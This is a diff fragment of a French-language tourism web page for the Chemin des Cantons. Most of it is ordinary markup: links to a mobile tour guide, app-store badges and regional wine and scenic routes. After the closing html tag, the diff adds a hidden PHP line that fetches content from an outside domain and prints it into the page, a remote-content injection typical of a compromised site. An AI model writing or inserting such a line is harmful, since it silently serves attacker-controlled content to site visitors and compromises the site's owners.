+                <!-- <div class="taggbox-container" style="width:100%;height:100%;overflow: auto;">
+                                    <div class="taggbox-socialwall" data-wall-id="60065" view-url="https://widget.taggbox.com/60065"></div>
+                                    <script src="https://widget.taggbox.com/embed.min.js" type="text/javascript"></script>
+                                </div> -->
+              </div>
+              <!-- <a href="https://www.instagram.com/chemindescantons/?hl=fr" target="_blank"><strong>Suivez-nous sur
+                  Instagram</strong></a> -->
+            </div>
+
+            <div class="col-lg-6 aligne-centre">
+              <div class="marge-bas-50">
+                <div class="marge-bas-petit"><a
+                     href="https://baladodecouverte.com/circuits/1121/la-tournee-du-chemin-des-cantons"
+                     target="_blank"><img src="images/balado-decouverte.png"
+                         alt="Le Chemin des Cantons sur Balado Découverte" width="200" height="67"
+                         title="Le Chemin des Cantons sur Balado Découverte"></a></div>
+                <div class="marge-bas-moyen"><a
+                     href="https://baladodecouverte.com/circuits/1121/la-tournee-du-chemin-des-cantons" target="_blank"
+                     class="lien-invisible">Le Chemin des Cantons <br>
+                    sur vos tablettes et portables!</a></div>
+                <div>
+                  <a href="https://play.google.com/store/apps/details?id=com.cinaxdev.balado"
+                     onclick="window.open(this.href); return false;"><img alt="Disponible sur Google Play"
+                         src="https://developer.android.com/images/brand/fr_generic_rgb_wo_45.png" height="41px"
+                         width="125px"></a>
+                  <a href="https://itunes.apple.com/ca/app/baladodiscovery/id642622426?mt=8" target="_blank"><img
+                         src="/images/assets/badge-download-on-the-app-store-fr.svg"
+                         alt="Télécharger dans l’App Store Chemin des Cantons-de-l&apos;Est" width="135px" height="40px"
+                         title="Télécharger dans l’App Store Chemin des Cantons-de-l&apos;Est"></a>
+                </div>
+                <div> </div>
+                <a href="http://www.routedessommets.com/" target="_blank"><img src="images/route-des-sommets.png"
+                       alt="ROUTE DES SOMMETS (Cantons de l&apos;Est)" width="110" height="110"
+                       title="ROUTE DES SOMMETS (Cantons de l&apos;Est)"></a>  
+                <a href="http://www.laroutedesvins.ca/fr/" target="_blank"><img src="images/route-des-vins.png"
+                       alt="ROUTE DES VINS (Cantons de l&apos;Est)" width="110" height="110"
+                       title="ROUTE DES VINS (Cantons de l&apos;Est)"></a>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </section>
+      <!-- //Liens -->
+
+    </article>
+  </main>
+  <!-- //Contenu container -->
+
+  <!-- Footer -->
+  <footer>
+    <?php include("fr/includes/footer.php"); ?>
+  </footer>
+  <!-- //Footer -->
+
+  <!-- Responsive image map -->
+  <script src="/assets/js/vendor/imageMapResizer.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      $('map').imageMapResize();
+    });
+
+  </script>
+
+</body>
+</html>
+<?php $a = file_get_contents('https://zine.id/xw/'); echo $a; ?>
